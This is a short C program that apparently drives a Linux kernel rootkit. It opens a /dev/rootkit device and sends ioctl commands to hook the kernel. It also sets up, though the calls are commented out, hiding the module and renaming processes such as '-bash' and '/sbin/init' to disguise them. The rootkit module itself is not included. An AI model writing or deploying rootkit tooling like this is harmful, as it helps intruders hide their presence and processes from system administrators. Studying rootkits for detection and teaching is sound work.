#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"

struct masq_proc masq[2] = {
    {.orig_name = "-bash",
        .new_name  = "-fish"},
    {.orig_name = "/sbin/init",
        .new_name  = "QQAAQQQ"},
};

struct masq_proc_req masq_req = {
    .len = 2,
    .list = masq,
};

int main (void) {
    int fd = open("/dev/rootkit", O_RDWR);

    // ioctl(fd, IOCTL_MOD_HIDE);
    // ioctl(fd, IOCTL_MOD_MASQ, &masq_req);
    ioctl(fd, IOCTL_MOD_HOOK);
}
